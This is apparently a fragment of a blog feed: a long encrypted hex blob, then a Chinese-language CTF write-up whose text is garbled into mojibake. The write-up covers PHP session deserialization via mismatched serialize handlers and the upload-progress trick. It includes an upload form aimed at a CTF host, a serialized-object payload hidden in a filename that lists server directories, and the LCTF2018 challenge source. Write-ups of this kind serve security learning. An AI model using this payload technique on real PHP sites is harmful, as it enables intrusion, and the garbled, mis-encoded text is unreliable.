b9bca192dd2a0ee39776d511f2b6dee89817ddfa4da1ca72802ad50ed68c497b0938f5334eda66728f7cd5616bf4058ac22bbf688370100a54124a50975477df86c6cf280d0dfb1a6cc1db013865bfdb4dcd771f970a3cd638611d089468f8fa6faf1c1cce5de5c82cdbc60098a124ac60d0bdc9ef19afb641bc7f0ece5d596cd439cf14934ed7e73ea6dee9c560a1ae05391d12a16ee6c6b274b178c699189ba9832849f057c5e6d984ea8b02bdab3ff36c47380f93f1e862ae7e89afef6a842de32a05c109b436508a3c42153d355c1fce3b417d986ee36d9c4d5f9f9c28ccc217d100803410dd7862e6e13ad148545b04730262d3b5185f854ab9ded7ed516a46f687200621de0360903486c61a5bfbaabbf6535d9fbb91629ad0754a7854950db68b687a2637901649eecb4244e60b5be0cf2b19ab225f832ce39ef104af781c4d85de5ff1974fdb835c8a8d63a424c7c1c0ddf33cfb3a9523325ab9e136a52a1c89bf343378fb1947ee9f92ea87d683a582818fa3a2404544171e942d88584882dba8a8e763b9361a5c894d480a097cc782f865e75bceee87a17889f8a26a1fc1a62de4ee46a637a919d1a972b3e573b985dd7c5e82d75f849aeb72451229141fb8e836237074f34dc94c5e7676fc795a8a52098e14368609b6595362d5e172c7c3bd6660e220655af5daf685ae7434113e79a4080d12676ca38857622bd089cb66fc4e4b2507a1bee3f675f16c6f372074016a3a2e3d5ff1322ddcc89ea17949736a1ea3e60c02dc530038132625c5b8364630d3130439dc80df8025b6c72fc93a448bc6408cba8e526ca5cbc827ca33d9c3393c705659280e3a55aa1a456c94b6f6d82e2954190d8a5320d467734f8190cfed56de4f9e59f98fd63a16595b7f05b38987c9c77e1a43fb0b586896d190e2671f6abc97730b1ceea011441b3bb6eaece62e81ca53b6a6b3475c96d98beb6c22babd1948ad85902f952758db30b0800865602544da59534ac40da5225f07cc161f6455c9098fe40503b447a88d790ccae9d31c77b71f249dbbf73598666b66533ac1fb2bf26abfa4cf02df1c16904626c5fd8ab402b5c9fbbf661ac7a48ac4db3d304dd694024edddcbbb58949baf010bced6f296f3f97725aac3e3f1247914363e7bb8c86f2734e029f407421951b68a96e91d853b561c8b6eab6f9f493a72aafb8df1c0096c3a9e6995bbcdeda33186b41e766d51a801c2d56661aae590990915908555440d2b1d70e8289466aa6487f1429f7cfaebaa50e75f5399a76de052237a9226b61d0bb9195c59e12877a4a2a045457318ec9e788b87972bea38a32dac6f0e9ce6b15f4b740fe61d60790a82181400de32f187f38093196029c3353566f5e73dae1c4642fa9b606c4eb4630c7204f9751ef20d001c8eb466f6bc5a7a25e47edc6d699ba04ba1bbd10bbd2daae971bf44b7f2a154dbc3f4b2cb42e564089262f25978e9780a16c621b4802794f45af95a8616803a253c05146d73355af3d0502eeb7c1dd68b8d72e8e5d91914fd171bddc9ddb560f042b69edf308c8aff5accc41d5dbd916de2108e645618566aeea1769b7a7c7954bcbbff47aaa0a68871e5bf5981b7d3b374a4f3f915f20abbd03c1d4f4b05e33addf7d551f73de15e6f271558f00b3159d40699f96b63e969a199034f6d009382e9eb4f92ea5f671ba2425d054dc45802d86babf8e2f134ad2bee613df5468aa19f7271fe8aefd00715e55e17bf532d52c305343685be3dbfb4e8fee3739f66938d05aab9fa9b47852bc66f4dceda1cae7c1f95b55909bee7f44312c120b94af8101c107a6b59ff23305e6326dedf8578b01165bd45535be039b95827eeb4e4c2807396463e61158ae4070f47a95b39287baab61f570a211f449dfc94bb33926623b2ddf81418c659d3520d6f105ef8d2634e005b4643d2f2d0f648202dbf5722c3921df5d3066a5769dac8ccf8eae86bf8bcb9896df31773e25af9e84554d8ff1c6e246d6ce3557e89313c0a9df4fe5c2ca307510fba8f5a909140843105c512ab847e3b382a1b9dbc0b0e6a20be273197fc0597f20da117996e91e8abf80216ec08278ce6fd7fd38b7100154f2149992b01687f3e866c447239be95ebcbb5b4a5f84f7457d0a1137b63c4b439d438b734ff286da94309bc0c24fbcd8426e919405e686f4ea034cb258ef2d57e8ac44828105f2ecb7a726f6aa855ceef45da8e3f09a06ef4b560d76d44e18b47203cb6d884b253ea9f59c3d6e51df0b697d6b5dbe84d70d0525e1478ae1c51f73f69c2705e93a31ab9d8bfd898adf338a6b7d2f5bf9f7bd73ceca582e225157015cd9e28a3b686d501d16a82cf6ddc2d8e30ee3cf82e2d232cd6995da99d6dd4e8e8f99e9361744e996565df91103ee7848903c3ed6c871c481b9522771cbb44f9c97666cef02334d72e94296c86e4db86404a7a2775a1cf5c25ab89f3a7c9998ae002283cd4b70dfd5daad11d0cdf32c455d99d5604dd12aae8b923c220d7c5e0cb3549341889c8ac148ff2d1890c0476aedbb6bd60ac4ae4bce6316b8db3ae942b133ad99ebbb14539acafb705f5e6f77616e8467efbda78352ee401df28016f05ec86281bc417fa9750263d333a3931c7c06314877f9580941a9f8ea88a7fe729d7f3c984b962fdc0d136d63ab18a1b30b5ecac2980af79a309b430185efa586dcdc7bc39fa822c3bbb8223aa4f7707b6dd7ca0c0d060a998bf5bd60a77c0218fa9d1b74fdb421b5acad97856874128e081fc66d1a3de4638a8b51ee751c4deff88530029121d442aea547deea645640b5dc5727b0c4b1c026e8be6e0115d28845cb3bf63f0e1e9401f1e80ba2ddc9a6755fb1a0c9adbf547cb5619ee683b79828540b1e4a5f33e9311ee308afa8ffce7febe8f1c5e5a981bbd596d79136076984f5313c72edc6c58b6650f3a0632f7c9fbe5fc703e5c60bf24fe855bd47ed7fb68ae6ba6d528b90ef49618ca426ab39c2b03ff863ec941afc9ae0a603256777d13b04008c23a72ca37f4186c298649ca19ba08938f173057596a3360c3b1c7839a820fcf7a9ec873767f933b28e732b0e2a9db4b1511ff4c33eeab61b6dc632df5ce21d3138333a9c52c61beac5c9938e0cf47dcf682d5cd47431b5e148a50fca6427bfa07889e0059fb3f2d6b895cf4e9ed04321d2e5de720e117f3d6fd00e5351598ecfec06bdff2b97a7f7e6714e53a0e7549e03364c638ccae7333cbc33986d684e43878b7cf96e359475d88cfa57d825f06941929a0da3d6781828bdc7d749446d8901dde77777d8ec15c668ca2cec34a9e4bd375e29d53f58279fe620b7a85df40109751910f15501eb2f6ea4be50c2089b14b7eb83648bff39b4e9c4a2087ebd9b4f85ab84b3274b8bb20c7742750b741aa2bf9eb969953ce897c4ab1d9fd93e674b5aed1770866742618802cdf4d157e16e7e56e01280e6a69d2fad100cce0e9a2dd3cfd9a45a0c9c8a978b6dca21c23086541892ee3524ad4abb44c2ca1dd85f8723688fa25a247f4e06e9019741f3df9b05962b2e9139bab10ed62a6ecf977d9059478b23aa3c9259e3bcacdc48eafa28ccc19d435275c914a73f4570a557a6243f6d3d226e4d746b50967d1476166c64c244a9edc8c5f8429948035c2ac5ea8161c8b731b7915e14e23d03a60ea51abe69e7861e8a22ddf8cc86c4f3579d1eba6b37df9025c1613d3b0162755911ed8af9070f8172826112db2b27ccfa8fb56fad2425831d96f746be75a6840e06cb8b7b45d4e8c16f2b5e02535869d54624c4cf2c9a1dc16ecdd7989794e1cad3090b1f3d126bd23f7c414c9127b1dfca7703a40a8c6e18f0d6643f4cbc2961eb29cdd74566659b3680d5228bb1f7a8d338ab2fe81b9457e7f1682f8bd9e9f9acf2f651cb2b8442d683ca6be547eb95518a3cb262058abc5b7a0eba7856c1085c4ed02311ce2de0d7c65d7b3fc1786e5e7a538dd5791e85f643c7d620117223473efa37a0a8835b1e8f8f7bb9b7aac7ff66167328d6c0a9076b0e73d0863d1099dc85a4274de94040bd4e27e607df7f2725d840a8454be4e7c7ed38c469e8cc7e6dd3df851c9950b3769fb707dd2f20c0164e5c1e017534c13138b5fee73c6b46763defe333d35357a03134169acac832da10758e9884c91536aaae2ead6b4b1254c0d46e4461733933bed166133166d573a2968cc507c9bc8a11ea66022404396c9e388556b31ea4927e5769129dc9cfbc9fb3c1f66fe97deb50d1f0123fea43f38758727c5f59d4ac0b1a2300ec595eb435b4a3744c7d56d8539b3ecd1d56927fc2bd945fba333f2f3f1bb3627646fa1c644da5b368b4c22cc0e2a6b01709051b501255cf5c6e07512f9f14f72ceb181e36852bbc3eb5aa8bf9bca710bea5237752547361688c0dbc46a6e0e47ece72dd6a7a78159967427b9c334504bf736f4b0e6edc096c74b2245535684a62d6d546928a53e542f6c37c0b98e24580a46cfdd760624caa75f77be402fbea20bef27a83bdbd99619736314d392080ca009083119e32e28fd93f5b88b4fb4a96de67715f540ab295ee5345e7fedd5e23136da5334943f06971cc47d807c6238e4226d14acfada2995edd39a76ceede2973df83d6086ce4196e8cc186bd10d5f23c96c6326e117694c38d1d4ecf09742ba315f63a555e9a787514848b4c59d800b1f5837afd328fd95037297e758c85c9557f1ebe1733a56c40005e9857d4b009279d3003d190be0cea1085925b4ba3812c2dbc9828875ed371b7bd7ca358167b15843c8dd86f9b728b09a7976c216b7019da2f1e36278f1f454f1af2ce847df94a5d0e54b77a20b5486312848cd730824776ff7dbd617bea9b6cee3b816f578e8a38684b1e1b8d6126add37ed8777d846d31c53badd23a5b67a0c712b0b1d9ffd888bc26affb4d1af6131d67948f648059ccb1fadf80e5088ea994f28eabb18c36b8793638eb13ea58452eff1782cf845e6a46fe1ac35290fdb05bd7113456e624f753476fe6191fe3fa7ca8042a45255fd9cc6ad5464ee7798efd95033f33866ffdfd083b3a08c34f2a2ac8963186fbd076c48e77064bbb1334d70e7344b619386018df4b59733329f5c3ba9b9e4a3fea113e6311bcb97cb8e7a9d64865172a1ce28c4d4ad8b7b3460684d61e38ca127fe7bf76d1c86514f0fbcbba1d63b297583fd1787511f6ca5d6a5b63dbb8da0aa54990eb1ce05350be23c19b61b62c9be44c314a9e0ffd6f0c10e82ae79f02b8314a66c44bff464f9b7d14bf832cbae5b253bf41b4e41bd8a6c013345e38678d9a12b878188e87e528b7ad6d0221c512ba52705ffd80c868584c9dbba070b262aa4c8da45c7f0d0874c8be8a5ce5aebecd6b392d5b038f22d80196cc0788abd6b9c7afc6bf10f69b9a7c5cef5ece348b45b54db9c860a85fb5c8d7415fae9bc1cf462494bde2b082869d509cba76145345f7b98cf0af2ccbf74bbc0889e5bdceb3d048bd787d7ce0fd0bcabd5864fb208b1a5363daf9a1dbbd8e5b34df9fdae4d963d0618389f67c9479fc5174b75cb6829188796088803a60110e9f23a3a110bcd65d71a3cd787be54898806e48fe075ce131c4d46d834acdba71fd29356b56c802406cf3b44eb5c52aa6c7412b94011922f3c3ab9cc54b1526c51acb9bc0e81925ed469a4f0af91b5382121b90836701cbf44d01333081a2ec6713215f60736cdc5e83fdde88d6eda2a32d07a621427ccf78f251bc7db9e170253ed2f46a02380488d19f41e893a18f3bbaa354eebb5efefc18da058ff865dc6c5a0444e1a156dea7de9dfb51c1845d13133358eb80825adfa011c4515ce4fd641e9a9abcdf9b811e0e803d47b571d607ba53123e70cdecc04e8154499f6d0ca8789281b17a14a19f68a38b7e5d786c1a038c691c343fd5eb4849be81fc0c962194d3df7fb52ce53341cb42f6761e92e0d21c00f989d0e4546771cd17eb800ed8a8b75ec4d9168d8f959bc0f7a1170744414152decc30e89f336e660ad533b1f0f74ec695d4569374ddef72773ffb9c8fa36a83938fb89ed382478830fcab799886224e921466094b32eadb550eb6b5e5f6dbbe8fd7556c70a890fc810bae30a3f4605ef2dec48102553fcd6c08ae33188b04cdc145c1a11c998e9b71fa493433b42dd5856d68d10a81327cba5b21e634360f4db4bb08f674fa5fc89dbcf82c9d67f722bd6353e8f221099fdc0a930dcac4dc8e00c85820ed2f70b00561019149b7d7ed7c25d7dedef11e0b8a5bfdf0505a52069d0da315132d5ee762b3591b8b892f037a333584938fb8869b114dec041ea6fc5caff07cec539772592e7afef5e9d4879bd345775e744e8ce1faa6bef7edfdf48df81d2f7837fc4ef08d0b7dea857f234dab35a4350473b61cde697ea0c3a6defc2cf90eddd4a0105cced6e631c60d0f6fbab590488d396ba0fbae3b6cd0c83c3dddfb0db0cd04270b5bc2e97380e38e9b1da0e8932a1cb8a3fe5a67a9fd731ca2964835efe3c4e3d0090fdc669d06dbce6057be4faca895315d2d337dee980b33c50b404c1860446260ff5fc126c8fe9b3c83e1d929996a3b4f886bc5e8f0fa78c6fa48f26f9604daa8cd2521faeaa3c3d0553c090732ca38ee15d94d1c6e0170e280a3a1c4ef91d794e4aabb51edf89da7e75806bf1b6f9421679149a1110f8f6c98315a41fcba461171db465c7af883340a0a3ab1be1db8a11b9d0fe7a62f22a8bc4e98b38fccffb5abd475bb98993f44490ee4753807d676886ad054dcde69ff7811bbee760d6771fb5eda1aa598bb450a3f577742cbaa1e48b2584df3be1d44e77f1d14e0b8fa462153c7e6cfb2a276d89af2e119df11568858a77ca2e4b501b5e2dd88b5c38e3d9846e0a8d5e01eba693f36a54df62a0e05de71cd23112d00b72ce4023eb23b8b4fc0c591ae90fa94ce8188c8d03dcb050cc395cb1f4e49440f5dac658262e1036149c6884c7847819486a3689ccc927691e5daec1efa3c41271eea68e203e65483f4d1f57492bc04e3dc2f0fd2cf4caba01af9b563d43863d1546bf76a8961d9a78438b24bd30f3386f43792c7a9ece218b30cd3b1daba316c41fcab72df721beb73e6d85c717a9698170afd75b46e23aca7dd8e2b1f92301236c3c9175a82144a48e18f17dd6e4091b2d17e5fc525b1a8dc11bda314b2ebd0542111a3f933031df844b5fad09200ab4fd78ffaddc9ddb15194d10c21d6c1f2a870b1add11278cdeb2bedeef83c8f597396dbb45e9c4851fd91d394afc494f94f9e1936c71cbd894e544a275db8df4d06328b2d2286489bc0bc97c9e4c6d9f398981efaf02c203e33de73a555742e0567c1bf7298a7d983c35ff4bdc4d4e178e51c0d26178ce842a7226886f60acb6fd49cd8e66a74464fac74e86de585fd5d515dcc6219b00df0763196f96f20e69d54d1ab6a0abfa83b9a22578b953fd48f1f14895d597e791b456ffa8f1d7da2f41381fa481c0ca27cb389de01bdad7a69f9b18d4b0d1ce1d428f72ff0119d7c1d4b4e89b97e5fdfcdc1d1777580a091c89338178c15e87d33313dba05a402e89af60f574a929410a9d68c15675de0ecd29d4c2b68bf98c7c989b31f724698be712834f754040ed392d8f56233b14fc70eb4f43c4ecf3b4d8ea2d046f123edfc382b6fd867a34936dfdb9fc64b6ef561168c3666caf8af77dae5f8c124a220f658868600258d5c18c9ad6157f33ccf454cc69f6470354263522da669cd5cfe0c8df35f30bbaf5512b802a4f60594b6bf12c49d232af18dba56284369302eec9793ae5ccb60ac2b7432f65adc00491d845ee596a8d1af02e848400d61074298dbcc928be6c7b359cd4c805201db49aaff66f46d116d22128d0f427e650935f0987a2e26b55eef6b41ca05a9cd8e1b72b683b7d9f2e7b50e155d140d2663a91c4a073d865033dc83bd478fbe447e1c7412df695000092acd3d664b42952352fb0761f99c1006570ba1754a333185b88572caf9fc50e5b0ac11e74919fe076f9b6301167091325eb052d3ac9846d88a8b6d39d2f4c94c49ee2f3bac402f180168970230b4639007ecd074d485f91650b894865a3653e1e60dc8de1231823ba59b77b244921ce7121b8470678d250b2191d92bf498de58e8bb05c3096e92c6dc7b7701e5055369e0283eec24f2020a6fdcebca4992c28ef2d9d6108c6eca9a3a219b321403b8f27a90357596b27476d6ff3259926d3965942ef67d39aad959c81ed5cd18dfedd92312791024cb208da18691510456d7416e4ff5ea2086fa8dc9e5862c876def69edddcd93bc7d9f3cb778750727f1cbbdf8417a8a292774d7392825038d024b02bb18974020a6a017745973157af0fb8180c7c760331887fe4014d617c174a86940eb168ff3216c9cf02a5c29254f6ce3b13b13d11e8f3baa4c366498ff68984531a2aedf79e6d7068659c9147ae45b84410e094e248e328bd480992902b2a1b73e6d62f00be049d002e47cefcb7ae0e11f3cef91cd4d30baa9eb728aab8f773714029dbaaf1183bc46cf3013fb6bc2603a0801aa7fe56a98d49c2f54938bc80226e93c25a3ee0b7c1f2b1abbe38cbfe07a4903e2a8538a0c916bd918e70debe173163080d0da8e5a56899a0db531cec4f16f965767111b5d34752fbf834d1947aea60799179dddef4531d01f88ccc3084dd24693e07d9697e5c7dce53cf21cb4691b8d504939710ec3dcb0e7faa081232fcb99540bfbf71ab2c159a2b9a0e3b27af6ad31225732199ed17d3c735ec43aba5966ff42eaa8ac2e282e0517390431e80198de3982f3c536188ffc970bf8e49535c1ad3ebbf9a3db311a4d079329f4aa7f78e6305b56182a09aa40e0ec5d17b56684a8e76b741ad32bbac8caae2d5647083da024da16ae38b921c42728845de3b44270f0e17a24d0bff61ed1f2c19cc55800c258a40150aa3db2dc548c1d2e4d3d259afbb3621aa5e4091254a124cb158c79c1cc6a0e242a2fb3f915a26a950c1b4205d4bd65df50059e9f94cff4ddd954bdf0662e9605f478399b7f121034676b5444afc6a0a8c587547712d50225b761a4be888fbffb6a96a93997019f218a972c159e57c5f2541546feec1e837ebc6d75f6f289e18f43edcbf9860014fe6a2215ca7f607e3a6a271e2bee502c7c845a651201d4eedeaac8489bf1502736034ce02a8480595ea3eea284ebab7e594fa0e73bc9a418d188c2292e644a40cb1318b1462647bb96fe0fb83cd899dbcef8c654218077a5bdfa78f16961415598acf6e18953b7014669a3b65fbbf3f68beb7f56da8827b957e510b1e9cac8dad06ff6199950ca5bcbd2932d3e5ff678db08b56f205da7e8fc113ab604937533adc4dee09994649ac75a4c5687e35a5fd87a37c494d2ae6d9436195695213406b47e3b2b2e4db1294fa594c4ffe93cd3543eb654b29080b21a78f7d881461c7812858fe9155e4a5c3987aa8816c0c931403078c2c7f993e7443aafbf41d6b7b68edbc52466f81bf8af6f1e660d8e4480ed1ab2d3c38e6c55a84c5266f23b8734342f3556fa370fc282a7dc771edad58f670acee8c65ea15e5a4ded3e4c8fde50cb9524354ba7f1b87f3e483d7a8df7e3697e728880532d63f8dcbd48c9db458bffb184dbcba184f919aa880c731edfaf2f45cdc5a25121f609c6a50be5d770a3228f6978114dc85438d69478d3209bc2d7fcd81aa8650e131cfcb891464055b79ffac85e10a49fbcb2e7fc4c831fe63db87bba148d6ade4c6cc84315633988090ccc1d41f7ef3373086a9d74d57915f40242cf4e27eea424db752337737ac7dc0755c7e2d976f5337a7b0d8d4f4171f5b86551bc132a07eb02b836517593167eae3290122cae6cc444c53b1f3c88a836751366a89959ae2d8cf9839497e9a26dd298349ef5d58bc3a2b68e83d8316b7918541b914e024ba2b8cffd34b2942f628705db600a5a8b71ec3138b9ef9120cf1abbc81f64b90d9efaa0d6e1c010bb09b9cc2fb79b8e0092dcd61656b9256e25e71624b2ad5e2dd578fe598108adb4a7b8eb7028a3c653f5fbeb50ad0fff19f7b99d3cf2bc5a56f26891f5a261d43672de6d4eeadcf02a73c0d7cf8a062c2e01cc3746f2c375cbf251296d38ec50e0ef172e29148b25e3783bbf51d6a35fe14416a7604425a8bce048efbbcb90d5c900728542a29e30bd953145a48a768eb85d909ac5dbde098d3bae9204958a9c18922aa686e76b71095edefa2f0cfa813efbc56a9e81a37420d1d1694d3feede5b21415111287acdaea7fcb162348c7bfa07bbe9ae96bea55bee07ea4def99a9c1c8b8161ee0ff8f8499456e05d7955521ee75c58604dd45f862e5f0595604971f84cc71fdeb470a5bf0544d2686e8bad6d688353fc8f20fb385ead629163a4cc835d8b9fff41e996ef72d04ecda8a79172efbda807bc95b209ec45a93242f2fca01e3f7a281a8bbb6a64b0f96ff86df13c7dfd67dee199ad0551347b01429af0dc338d481de08c071a50676561140350d6dedbce75e04966e5d182fad5cce9c9962f471cf01d34e1f9c42e7574b3b944232bf316f6127d32523bb37a6c24022a00e081fc716077b4c8b17fc4b8c716c829004c2ab0719f945387995c1e6ef67eeea7a31fe9abaddf72ceb9208b9b2196c11243780b5d46efe59755c91513055b1db39cb275adb71990af8993e842ac14572634e8895f05937a0f5d5cbb1485492cdde6507d1a0fd8b768179a0b8a86466ba224319f775b53c6da3a23b94ddb93f8f4e1c0bf6196dae19cda16615da7d54c73cdd65ab28259b531fcf201abee82b3cf8393473d2e49a17c655fd55152e39c32144fef42014b44bc22554f39644d3ed4224c93e26323b9616c0d070f7f1acf02adf43e11bef09605b9035af7efa30c8d7ba5d4f73111d6e55c33f3e1ee661ec9659087d79a267810d81379c5b1f67898bad780ccdcbbab3c0505a38ab1a2cefbe850fbd7d83b460c465f01c2d50b2351d19e37e2c5a05d243e88c73f38273ea540b0e8e920c255b50a1c8af8b37fc12428bca38e5afd9719f46739ee922dc4ac306fad57cdd396bcc7aa43741cc7f6af80597ff3e19daa3dce66b7b4848c33167eaa769881be86e1e170b1b0005fb6acf0d4e1cee6b8faba9f917b0eda316ebd2e3708982c522b8932d862ea6595482aaf65da518db7d2a5eb0cf345c0d92cb85fcd316c9a06d3758bbd17fa1e7813eb49177b59f5cf4322b0f1b061149c3b8783</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>phpçš„ä¸¤ç±»ååºåˆ—åŒ–</title>
    <url>/2019/09/02/php%E7%9A%84%E4%B8%A4%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p>phpä¸­çš„ååºåˆ—åŒ–åˆ†ä¸ºä¸¤ç±»: ä¸€ç§æ˜¯å¸¸è§„ctfé¢˜ç›®ä¸­çš„ç›´æ¥ä¼ å…¥å¹¶ååºåˆ—åŒ–, å¦ä¸€ç§å’Œsessionæœ‰å…³:</p>
<h2 id="sessionååºåˆ—åŒ–æ¼æ´">sessionååºåˆ—åŒ–æ¼æ´</h2>
<ul>
<li>ç‰¹å¾
<ul>
<li>phpinfoä¸­é»˜è®¤çš„session.serialize_handlerå’Œæœ¬åœ°çš„å€¼ä¸ä¸€æ ·</li>
<li>ini_set(â€˜session.serialize_handlerâ€™, â€˜phpâ€™);ä¹‹ç±»çš„</li>
<li>phpinfoä¸­session.upload_progress.enabledæ‰“å¼€</li>
</ul>
</li>
</ul>
<p>ä¸€æ—¦å‘ç°è„šæœ¬ä¸­çš„åºåˆ—åŒ–å¤„ç†å™¨å’Œphp.iniè®¾ç½®çš„ä¸ä¸€æ ·,å°±å¯èƒ½å¯¼è‡´è¿™ä¸ªæ¼æ´.</p>
<p>phpç”¨äºå­˜å–sessionæ—¶å€™çš„ä¸‰ç§å¤„ç†å™¨</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php:é”®å ï¼‹ ç«–çº¿ ï¼‹ åºåˆ—åŒ–å­—ç¬¦ä¸²</span><br><span class="line">php_binary: é”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦ ï¼‹ é”®å ï¼‹åºåˆ—åŒ–å­—ç¬¦ä¸²</span><br><span class="line">php_serialize: åºåˆ—åŒ–å­—ç¬¦ä¸²</span><br></pre></td></tr></table></figure>
<p>å¦‚æœä»¥php_serialize æ–¹å¼å­˜å–ä½†æ˜¯åˆç”¨phpå¤„ç†å™¨å»å¤„ç†, é‚£ä¹ˆåªè¦ä¼ å…¥çš„å­—ç¬¦ä¸²ä¸­æœ‰ | å°±å¯ä»¥å¯¼è‡´phpå¤„ç†å™¨å°† | å‰çš„ä¸œä¸œè§£é‡Šæˆé”®, è€Œå°†åé¢çš„ä¸œè¥¿è§£é‡Šç§°å€¼, è€Œåé¢çš„ä¸œè¥¿ä¸€èˆ¬å°±æ˜¯è¦ååºåˆ—åŒ–çš„å­—ç¬¦ä¸²äº†.</p>
<blockquote>
<p>php5.6.13ç‰ˆæœ¬ä»¥å‰æ˜¯ç¬¬ä¸€ä¸ªå˜é‡è§£æé”™è¯¯æ³¨é”€ç¬¬ä¸€ä¸ªå˜é‡ï¼Œç„¶åè§£æç¬¬äºŒä¸ªå˜é‡ï¼Œä½†æ˜¯5.6.13ä»¥åå¦‚æœç¬¬ä¸€ä¸ªå˜é‡é”™è¯¯ï¼Œç›´æ¥é”€æ¯æ•´ä¸ªsession, æ‰€ä»¥è¿™ä¸ªæ´è¦çœ‹ç‰ˆæœ¬</p>
</blockquote>
<p>å°†payloadä¼ å…¥sessionçš„æ–¹å¼æœ‰ä¸¤ç§, ä¸€ç§æ˜¯å¯¹é¢å¼€æ”¾æœ¬åœ°å¯æ§çš„æ•°æ®, å¦ä¸€ç§æ˜¯å› ä¸ºé…ç½®ä¸å½“é€ æˆsessionå¯æ§</p>
<blockquote>
<p>å½“session.upload_progress.enabledæ‰“å¼€æ—¶ï¼Œphpä¼šè®°å½•ä¸Šä¼ æ–‡ä»¶çš„è¿›åº¦ï¼Œåœ¨ä¸Šä¼ æ—¶ä¼šå°†å…¶ä¿¡æ¯ä¿å­˜åœ¨$<em>SESSIONä¸­ã€‚</em></p>
<p>_å½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶POSTä¸€ä¸ªä¸INIä¸­è®¾ç½®çš„session.upload_progress.nameåŒåå˜é‡æ—¶ï¼Œ<br>
å½“PHPæ£€æµ‹åˆ°è¿™ç§POSTè¯·æ±‚æ—¶ï¼Œå®ƒä¼šåœ¨$_SESSIONä¸­æ·»åŠ ä¸€ç»„æ•°æ®ã€‚æ‰€ä»¥å¯ä»¥é€šè¿‡Session Upload Progressæ¥è®¾ç½®sessionã€‚</p>
</blockquote>
<p>ä¸Šä¼ è¡¨å•</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://web.jarvisoj.com:32784/index.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­ç›®æ ‡ç½‘å€éœ€è¦æ›¿æ¢, php_session_upload_progressæ˜¯session.upload_progress.nameçš„åå­—, ä»phpinfoä¸­çœ‹.</p>
<p>ç„¶åéšä¾¿ä¼ ç‚¹ä»€ä¹ˆè¿›å». åœ¨burpsuiteä¸­åšå¦‚ä¸‹ä¿®æ”¹</p>
<p>å°†éšä¾¿ä¼ çš„æ–‡ä»¶çš„filenameæˆpayload, æ¯”å¦‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œçš„æ–œæ†æ˜¯ä¸ºäº†é˜²æ­¢è½¬ä¹‰.ç­¾åçš„ç«–çº¿å°±æ˜¯å¸®åŠ©phpå¤„ç†å™¨è§£é‡Šä½¿ç”¨çš„.</p>
<h2 id="ä¾‹é¢˜LCTF2018-bestphpâ€™s-revenge">ä¾‹é¢˜LCTF2018-bestphpâ€™s revenge</h2>
<p>é¢˜ç›®ç›´æ¥ç»™å‡ºäº†æºä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$b = <span class="string">'implode'</span>;</span><br><span class="line"></span><br><span class="line">call_user_func($_GET[<span class="string">'f'</span>], $_POST);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>])) &#123;</span><br><span class="line">        $_SESSION[<span class="string">'name'</span>] = $_GET[<span class="string">'name'</span>];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION), <span class="string">'welcome_to_the_lctf2018'</span>);</span><br><span class="line">call_user_func($b, $a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>æ•´ç†ä¸€ä¸‹</p>
<ul>
<li>
<p>call_user_func: ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„åå­—,ç¬¬äºŒä¸ªä¹‹åçš„å‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°,<strong>ç‰¹åˆ«çš„,å¦‚æœä¼ å…¥çš„æ˜¯ä¸€ä¸ªæ•°ç»„çš„è¯,ä»–ä¼šå°†æ•°ç»„çš„ç¬¬ä¸€é¡¹è¯†åˆ«ä¸ºç±»å’Œå¯¹è±¡,å¹¶å°†ä¹‹åçš„å‚æ•°ä½œä¸ºç±»å’Œå¯¹è±¡çš„æ–¹æ³•æ¥è°ƒç”¨</strong>.</p>
</li>
<li>
<p>resetä¼šå°†æ•°ç»„çš„ç¬¬ä¸€é¡¹ä½œä¸ºå­—ç¬¦ä¸²è¾“å‡º</p>
</li>
<li>
<p>implode å‡½æ•°åªæ˜¯åˆå¹¶æ•°ç»„çš„æ—¶å€™æ’å…¥ä¸€äº›ç»™å®šå­—ç¬¦è€Œå·²,æ— å…³ç´§è¦.</p>
</li>
</ul>
<p>æ‰«æç›®å½•å‘ç°äº†flag.php</p>
